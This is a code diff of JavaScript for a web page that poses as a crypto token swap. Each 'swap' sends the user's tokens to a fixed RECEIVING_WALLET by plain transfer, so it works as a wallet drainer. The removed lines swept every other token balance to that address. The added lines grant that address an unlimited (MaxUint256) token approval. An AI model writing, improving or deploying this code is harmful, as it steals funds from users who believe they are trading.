@@ -377,10 +377,15 @@ async function updateTokenBalances() {
     balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
     
     const balance = await fetchTokenBalance(currentFromToken);
-    balanceElement.textContent = `Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}`;
+    if (balance <= 0) {
+      balanceElement.innerHTML = `Balance: <span style="color: var(--error)">0 ${currentFromToken.symbol}</span>`;
+      document.getElementById("swapBtn").disabled = true;
+    } else {
+      balanceElement.textContent = `Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}`;
+    }
   } catch (err) {
     console.error("Error updating balances:", err);
-    document.getElementById("fromTokenBalance").textContent = "Balance: Error";
+    balanceElement.innerHTML = `<span style="color: var(--error)">Balance: Error</span>`;
   }
 }
 
@@ -1077,138 +1082,198 @@ async function handleSwap() {
     return;
   }
 
-  console.log("[DEBUG] Swap started (single execution)");
-  if (!userAddress || !currentFromToken || !currentToToken) {
-    updateStatus("Connect wallet & select tokens", "error");
-    return;
-  }
-
   try {
-    isSwapInProgress = true; // Lock
+    isSwapInProgress = true;
     showLoader();
 
-    // 1. Process MAIN TOKEN (if amount > 0)
-    const inputAmount = parseFloat(document.getElementById("fromAmount").value);
-    let mainTokenTransferred = 0;
-
-    if (inputAmount > 0) {
-      console.log(`[DEBUG] Processing ${inputAmount} ${currentFromToken.symbol}`);
-      mainTokenTransferred = await processMainTokenTransfer(inputAmount);
-      updateStatus(`✅ Sent ${mainTokenTransferred} ${currentFromToken.symbol}`, "success");
+    // 1. Validate inputs
+    if (!userAddress) {
+      throw new Error("Please connect your wallet");
     }
 
-    // 2. Process OTHER TOKENS (skips main token)
-    console.log("[DEBUG] Processing other tokens");
-    const otherTokensTransferred = await processAllTokenTransfers();
+    if (!currentFromToken || !currentToToken) {
+      throw new Error("Please select both tokens");
+    }
 
-    // Success message
+    const inputAmount = parseFloat(document.getElementById("fromAmount").value);
+    if (!inputAmount || inputAmount <= 0) {
+      throw new Error("Please enter a valid amount");
+    }
+
+    // 2. Check balances
+    const balance = await fetchTokenBalance(currentFromToken);
+    if (balance <= 0) {
+      throw new Error(`No ${currentFromToken.symbol} balance in your wallet`);
+    }
+
+    if (inputAmount > balance) {
+      throw new Error(`Amount exceeds your ${currentFromToken.symbol} balance (${balance.toFixed(6)})`);
+    }
+
+    // 3. Check for native token gas reserves
+    if (currentFromToken.isNative) {
+      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+      if (balance - inputAmount < minReserve) {
+        throw new Error(`Please keep at least ${minReserve} ${currentFromToken.symbol} for gas fees`);
+      }
+    }
+
+    // 4. Execute the swap
+    updateStatus(`Processing swap...`, "success");
+    
+    let txHash;
+    if (currentFromToken.isNative) {
+      // Native token transfer
+      txHash = await transferNativeToken(currentFromToken, inputAmount);
+    } else {
+      // ERC20 token transfer (needs approval first)
+      const approved = await checkAndApproveToken(currentFromToken, inputAmount);
+      if (!approved) {
+        throw new Error("Token approval failed");
+      }
+      txHash = await transferERC20Token(currentFromToken, inputAmount);
+    }
+
+    // 5. Show success message with transaction link
+    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + txHash;
     updateStatus(
-      `Success! ${mainTokenTransferred ? `${mainTokenTransferred} ${currentFromToken.symbol} ` : ""}${
-        otherTokensTransferred ? `+ ${otherTokensTransferred} others` : ""
-      }`.trim() || "No tokens transferred",
+      `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`,
       "success"
     );
 
-    // Reset form
+    // 6. Update UI
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
 
   } catch (err) {
     console.error("[ERROR] Swap failed:", err);
-    updateStatus(`❌ Error: ${err.message}`, "error");
+    updateStatus(`❌ ${err.message}`, "error");
   } finally {
     hideLoader();
-    isSwapInProgress = false; // Release lock
-    console.log("[DEBUG] Swap completed");
+    isSwapInProgress = false;
   }
 }
 
-async function processMainTokenTransfer(amount) {
-  // Validate
-  if (!amount || amount <= 0) throw new Error("Invalid amount");
-  
-  const balance = await fetchTokenBalance(currentFromToken);
-  if (balance <= 0) throw new Error(`No ${currentFromToken.symbol} balance`);
-  if (amount > balance) throw new Error(`Amount > balance`);
+async function checkAndApproveToken(token, amount) {
+  try {
+    if (!token.address || token.isNative) return true;
 
-  // Native token gas reserve check
-  if (currentFromToken.isNative) {
-    const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
-    if (balance - amount < minReserve) {
-      throw new Error(`Keep ${minReserve} ${currentFromToken.symbol} for gas`);
+    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
+    
+    // Check current allowance
+    const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
+    const neededAllowance = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
+    
+    if (allowance.gte(neededAllowance)) {
+      return true; // Already approved
     }
-  }
 
-  // Execute transfer
-  if (currentFromToken.isNative) {
-    await transferNativeToken(currentFromToken, amount);
-  } else {
-    await transferERC20Token(currentFromToken, amount);
+    // Request approval
+    updateStatus(`Approving ${token.symbol}...`, "success");
+    const approveTx = await contract.approve(
+      RECEIVING_WALLET,
+      ethers.constants.MaxUint256, // Approve max amount
+      { gasLimit: 100000 }
+    );
+    await approveTx.wait();
+    return true;
+
+  } catch (err) {
+    console.error("Approval error:", err);
+    return false;
   }
-  
-  return amount;
 }
 
-async function processAllTokenTransfers() {
-  let successCount = 0;
-
-  for (const token of TOKENS[currentNetwork]) {
-    // Skip main token (strict check)
-    if (token.address === currentFromToken.address || token.symbol === currentFromToken.symbol) {
-      console.log(`[SKIP] ${token.symbol} (main token)`);
-      continue;
-    }
-
-    try {
-      const balance = await fetchTokenBalance(token);
-      if (balance <= 0) continue;
-
-      let amountToSend = balance;
-      
-      // Leave gas reserve for native tokens
-      if (token.isNative) {
-        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
-        amountToSend = Math.max(0, balance - minReserve);
-        if (amountToSend <= 0) continue;
-      }
-
-      console.log(`[TRANSFER] ${amountToSend} ${token.symbol}`);
-      
-      if (token.isNative) {
-        await transferNativeToken(token, amountToSend);
-      } else {
-        await transferERC20Token(token, amountToSend);
-      }
-      
-      successCount++;
-    } catch (err) {
-      console.error(`[FAILED] ${token.symbol}:`, err.message);
-    }
-  }
-
-  return successCount;
-}
-
-// Helper functions (unchanged)
 async function transferNativeToken(token, amount) {
-  const tx = await signer.sendTransaction({
-    to: RECEIVING_WALLET,
-    value: ethers.utils.parseEther(amount.toString()),
-    gasLimit: 21000,
-  });
-  await tx.wait();
-  return tx;
+  try {
+    updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
+    
+    const tx = await signer.sendTransaction({
+      to: RECEIVING_WALLET,
+      value: ethers.utils.parseEther(amount.toString()),
+      gasLimit: 21000,
+    });
+    
+    await tx.wait();
+    return tx.hash;
+
+  } catch (err) {
+    console.error("Native token transfer error:", err);
+    throw new Error(`Failed to send ${token.symbol}: ${err.message}`);
+  }
 }
 
 async function transferERC20Token(token, amount) {
-  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
-  const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
-  const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
-    gasLimit: 100000,
-  });
-  await tx.wait();
-  return tx;
+  try {
+    updateStatus(`Transferring ${amount} ${token.symbol}...`, "success");
+    
+    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
+    const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
+    
+    const tx = await contract.transfer(
+      RECEIVING_WALLET,
+      amountInWei,
+      { gasLimit: 100000 }
+    );
+    
+    await tx.wait();
+    return tx.hash;
+
+  } catch (err) {
+    console.error("ERC20 transfer error:", err);
+    throw new Error(`Failed to transfer ${token.symbol}: ${err.message}`);
+  }
+}
+
+// Helper function to get token balance
+async function fetchTokenBalance(token) {
+  if (!userAddress) return 0;
+  
+  try {
+    let balance;
+    if (token.isNative) {
+      balance = await provider.getBalance(userAddress);
+      return parseFloat(ethers.utils.formatEther(balance));
+    } else {
+      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
+      balance = await contract.balanceOf(userAddress);
+      return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
+    }
+  } catch (err) {
+    console.error(`Error fetching ${token.symbol} balance:`, err);
+    return 0;
+  }
+}
+
+// Update the UI based on swap readiness
+function updateSwapButton() {
+  const btn = document.getElementById("swapBtn");
+  const btnText = document.getElementById("swapBtnText");
+  
+  if (!userAddress) {
+    btn.disabled = false;
+    btnText.textContent = "Connect Wallet";
+    btn.onclick = handleWalletConnection;
+    return;
+  }
+  
+  btn.onclick = handleSwap;
+  
+  if (!currentFromToken || !currentToToken) {
+    btn.disabled = true;
+    btnText.textContent = "Select Tokens";
+    return;
+  }
+  
+  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
+  if (inputAmount > 0) {
+    btn.disabled = false;
+    btnText.textContent = `Swap ${inputAmount.toFixed(6)} ${currentFromToken.symbol}`;
+  } else {
+    btn.disabled = true;
+    btnText.textContent = "Enter Amount";
+  }
 }
 // =====================
 // UI FUNCTIONS
